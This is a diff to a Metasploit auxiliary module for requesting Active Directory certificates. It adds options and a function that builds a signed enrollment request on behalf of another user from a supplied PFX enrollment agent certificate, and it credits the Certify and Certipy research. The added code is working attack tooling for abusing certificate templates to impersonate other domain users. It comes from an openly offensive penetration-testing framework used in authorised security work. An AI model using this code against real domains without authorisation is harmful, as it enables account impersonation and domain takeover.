@@ -15,6 +15,8 @@ class MetasploitModule < Msf::Auxiliary
   OID_NT_PRINCIPAL_NAME = '1.3.6.1.4.1.311.20.2.3'.freeze
   # [[MS-WCCE]: Windows Client Certificate Enrollment Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-winerrata/c39fd72a-da21-4b13-b329-c35d61f74a60)
   OID_NTDS_OBJECTSID = '1.3.6.1.4.1.311.25.2.1'.freeze
+  # [[MS-WCCE]: 2.2.2.7.10 szENROLLMENT_NAME_VALUE_PAIR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/92f07a54-2889-45e3-afd0-94b60daa80ec)
+  OID_ENROLLMENT_NAME_VALUE_PAIR = '1.3.6.1.4.1.311.13.2.1'.freeze
 
   def initialize(info = {})
     super(
@@ -28,15 +30,20 @@ class MetasploitModule < Msf::Auxiliary
         },
         'License' => MSF_LICENSE,
         'Author' => [
+          'Will Schroeder', # original idea/research
+          'Lee Christensen', # original idea/research
           'Oliver Lyak', # certipy implementation
-          'Spencer McIntyre',
+          'Spencer McIntyre'
         ],
         'References' => [
+          [ 'URL', 'https://github.com/GhostPack/Certify' ],
+          [ 'URL', 'https://github.com/ly4k/Certipy' ]
         ],
         'Notes' => {
           'Reliability' => [],
           'Stability' => [],
-          'SideEffects' => [ IOC_IN_LOGS ]
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'AKA' => [ 'Certifry', 'Certipy' ]
         },
         'Actions' => [
           [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
@@ -49,8 +56,13 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('CA', [ true, 'The target certificate authority' ]),
       OptString.new('CERT_TEMPLATE', [ true, 'The certificate template', 'User' ]),
       OptString.new('ALT_DNS', [ false, 'Alternative certificate DNS' ]),
-      OptString.new('ALT_UPN', [ false, 'Alternative certificate UPN' ]),
+      OptString.new('ALT_UPN', [ false, 'Alternative certificate UPN (format: USER@DOMAIN)' ]),
+      OptPath.new('PFX', [ false, 'Certificate to request on behalf of' ]),
+      OptString.new('ON_BEHALF_OF', [ false, 'Username to request on behalf of (format: DOMAIN\\USER)' ]),
       Opt::RPORT(445)
+    ])
+    register_advanced_options([
+      OptEnum.new('DigestAlgorithm', [ true, 'The digest algorithm to use', 'SHA256', %w[SHA1 SHA256] ])
     ])
   end
 
@@ -67,6 +79,12 @@ class MetasploitModule < Msf::Auxiliary
     vprint_good('Bound to \\cert')
 
     icpr
+  end
+
+  def setup
+    send("setup_#{action.name.downcase}")
+
+    super
   end
 
   def run
@@ -120,14 +138,49 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unknown, e.message)
   end
 
+  def setup_request_cert
+    errors = {}
+    if datastore['ALT_UPN'].present? && datastore['ALT_UPN'] !~ /^\S+@[^\s\\]+$/
+      errors['ALT_UPN'] = 'Must be in the format USER@DOMAIN.'
+    end
+
+    if datastore['ON_BEHALF_OF'].present?
+      errors['ON_BEHALF_OF'] = 'Must be in the format DOMAIN\\USER.' unless datastore['ON_BEHALF_OF'] =~ /^[^\s@]+\\\S+$/
+      errors['PFX'] = 'A PFX file is required when ON_BEHALF_OF is specified.' if datastore['PFX'].blank?
+    end
+
+    @pkcs12 = nil
+    if datastore['PFX'].present?
+      begin
+        @pkcs12 = OpenSSL::PKCS12.new(File.binread(datastore['PFX']))
+      rescue StandardError => e
+        errors['PFX'] = "Failed to load the PFX file (#{e})"
+      end
+    end
+
+    raise OptionValidateError, errors unless errors.empty?
+  end
+
   def action_request_cert
     private_key = OpenSSL::PKey::RSA.new(2048)
     csr = build_csr(
       cn: datastore['SMBUser'],
       private_key: private_key,
       dns: (datastore['ALT_DNS'].blank? ? nil : datastore['ALT_DNS']),
-      msext_upn: (datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN'])
+      msext_upn: (datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN']),
+      algorithm: datastore['DigestAlgorithm']
     )
+
+    if @pkcs12 && datastore['ON_BEHALF_OF'].present?
+      vprint_status("Building certificate request on behalf of #{datastore['ON_BEHALF_OF']}")
+      csr = build_on_behalf_of(
+        csr: csr,
+        on_behalf_of: datastore['ON_BEHALF_OF'],
+        cert: @pkcs12.certificate,
+        key: @pkcs12.key,
+        algorithm: datastore['DigestAlgorithm']
+      )
+    end
 
     attributes = { 'CertificateTemplate' => datastore['CERT_TEMPLATE'] }
     san = []
@@ -173,8 +226,9 @@ class MetasploitModule < Msf::Auxiliary
   # @param [OpenSSL::PKey] private_key The private key for the certificate.
   # @param [String] dns An alternative DNS name to use.
   # @param [String] msext_upn An alternative User Principal Name (this is a Microsoft-specific feature).
+  # @param [String] algorithm The digest algorithm to use.
   # @return [OpenSSL::X509::Request] The request object.
-  def build_csr(cn:, private_key:, dns: nil, msext_upn: nil)
+  def build_csr(cn:, private_key:, dns: nil, msext_upn: nil, algorithm: 'SHA256')
     request = OpenSSL::X509::Request.new
     request.version = 1
     request.subject = OpenSSL::X509::Name.new([
@@ -195,8 +249,79 @@ class MetasploitModule < Msf::Auxiliary
       ))
     end
 
-    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
+    request.sign(private_key, OpenSSL::Digest.new(algorithm))
     request
+  end
+
+  # Make a certificate request on behalf of another user.
+  #
+  # @param [OpenSSL::X509::Request] csr The certificate request to make on behalf of the user.
+  # @param [String] on_behalf_of The user to make the request on behalf of.
+  # @param [OpenSSL::X509::Certificate] cert The public key to use for signing the request.
+  # @param [OpenSSL::PKey::RSA] key The private key to use for signing the request.
+  # @param [String] algorithm The digest algorithm to use.
+  # @return [Rex::Proto::Kerberos::Model::Pkinit::ContentInfo] The signed request content.
+  def build_on_behalf_of(csr:, on_behalf_of:, cert:, key:, algorithm: 'SHA256')
+    # algorithm needs to be one that OpenSSL supports, but we also need the OID constants defined
+    digest = OpenSSL::Digest.new(algorithm)
+    unless [ digest.name, "RSAWith#{digest.name}" ].all? { |s| Rex::Proto::Kerberos::Model::OID.constants.include?(s.to_sym) }
+      raise ArgumentError, "Can not map digest algorithm #{digest.name} to the necessary OIDs."
+    end
+
+    digest_oid = Rex::Proto::Kerberos::Model::OID.const_get(digest.name)
+
+    signer_info = Rex::Proto::Kerberos::Model::Pkinit::SignerInfo.new(
+      version: 1,
+      sid: {
+        issuer: cert.issuer,
+        serial_number: cert.serial.to_i
+      },
+      digest_algorithm: {
+        algorithm: digest_oid
+      },
+      signed_attrs: [
+        {
+          attribute_type: OID_ENROLLMENT_NAME_VALUE_PAIR,
+          attribute_values: [
+            RASN1::Types::Any.new(value: Rex::Proto::CryptoAsn1::EnrollmentNameValuePair.new(
+              name: 'requestername',
+              value: on_behalf_of
+            ))
+          ]
+        },
+        {
+          attribute_type: Rex::Proto::Kerberos::Model::OID::MessageDigest,
+          attribute_values: [RASN1::Types::Any.new(value: RASN1::Types::OctetString.new(value: digest.digest(csr.to_der)))]
+        }
+      ],
+      signature_algorithm: {
+        algorithm: Rex::Proto::Kerberos::Model::OID.const_get("RSAWith#{digest.name}")
+      }
+    )
+    data = RASN1::Types::Set.new(value: signer_info[:signed_attrs].value).to_der
+    signature = key.sign(digest, data)
+
+    signer_info[:signature] = signature
+
+    signed_data = Rex::Proto::Kerberos::Model::Pkinit::SignedData.new(
+      version: 3,
+      digest_algorithms: [
+        {
+          algorithm: digest_oid
+        }
+      ],
+      encap_content_info: {
+        econtent_type: Rex::Proto::Kerberos::Model::OID::PkinitAuthData,
+        econtent: csr.to_der
+      },
+      certificates: [{ openssl_certificate: cert }],
+      signer_infos: [signer_info]
+    )
+
+    Rex::Proto::Kerberos::Model::Pkinit::ContentInfo.new(
+      content_type: Rex::Proto::Kerberos::Model::OID::SignedData,
+      signed_data: signed_data
+    )
   end
 
   # Get the object security identifier (SID) from the certificate. This is a Microsoft specific extension.
